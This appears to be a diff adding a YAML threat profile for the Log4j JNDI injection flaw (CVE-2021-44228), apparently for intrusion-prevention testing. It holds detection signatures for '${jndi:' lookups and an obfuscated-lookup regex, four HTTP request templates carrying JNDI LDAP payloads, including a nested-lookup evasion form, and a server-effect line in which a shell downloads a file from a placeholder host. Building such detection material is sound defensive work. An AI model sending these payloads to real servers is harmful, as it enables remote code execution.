@@ -1,0 +1,65 @@
+id: TP-2021-44228
+cve: [CVE-2021-44228]
+name: Log4j.JNDI.Lookup.Injection
+severity: critical
+target: {os: [Linux, Windows], app: [Apache Log4j]}
+location: server
+summary: >-
+  Log4j 2 versions before 2.15.0 evaluate ${...} lookups inside logged strings. A JNDI lookup in any
+  logged field (a header, a parameter) makes the server fetch and load a remote object. Attackers spray
+  the lookup in User-Agent, X-Api-Version and query strings, often obfuscated with nested lookups such
+  as ${${lower:j}ndi:...} to dodge naive filters.
+references:
+  - https://nvd.nist.gov/vuln/detail/CVE-2021-44228
+  - https://logging.apache.org/log4j/2.x/security.html
+signatures:
+  - id: 9100001
+    name: JNDI lookup in a request header
+    proto: tcp
+    ports: [80, 443, 8080, 8443]
+    match:
+      - {buf: header, contains: "${jndi:", nocase: true}
+  - id: 9100002
+    name: JNDI lookup in the URI
+    proto: tcp
+    ports: [80, 443, 8080, 8443]
+    match:
+      - {buf: uri, contains: "${jndi:", nocase: true}
+  - id: 9100003
+    name: Obfuscated JNDI lookup (nested lookups)
+    proto: tcp
+    ports: [80, 443, 8080, 8443]
+    match:
+      - {buf: raw, regex: "\\$\\{(\\$\\{[^}]{1,20}\\}|[jndi]){2,8}:(ldaps?|rmi|dns|iiop|https?)", nocase: true}
+generator:
+  port: 80
+  tls: false
+  variants:
+    - name: user-agent
+      request: |-
+        GET /citas/buscar?doc={{token}} HTTP/1.1
+        Host: {{target_host}}
+        User-Agent: ${jndi:ldap://{{sinkhole}}:1389/{{token}}}
+        Accept: */*
+        Connection: close
+    - name: x-api-version
+      request: |-
+        GET /api/v1/status HTTP/1.1
+        Host: {{target_host}}
+        User-Agent: Mozilla/5.0 (compatible; scan)
+        X-Api-Version: ${jndi:ldap://{{sinkhole}}:1389/{{token}}}
+        Connection: close
+    - name: query-string
+      request: |-
+        GET /login?user=${jndi:ldap://{{sinkhole}}:1389/{{token}}} HTTP/1.1
+        Host: {{target_host}}
+        User-Agent: curl/8.5.0
+        Connection: close
+    - name: obfuscated
+      request: |-
+        GET / HTTP/1.1
+        Host: {{target_host}}
+        User-Agent: ${${lower:j}${lower:n}di:ldap://{{sinkhole}}:1389/{{token}}}
+        Connection: close
+server_effect: {process: "java -jar citas.jar -> /bin/sh -c curl -s http://{{sinkhole}}/x -o /tmp/.x", when: allowed}
+lesson: An IPS sensor on the DMZ policy stops this at the FortiGate; without one the request reaches the server and only the endpoint sees what follows.
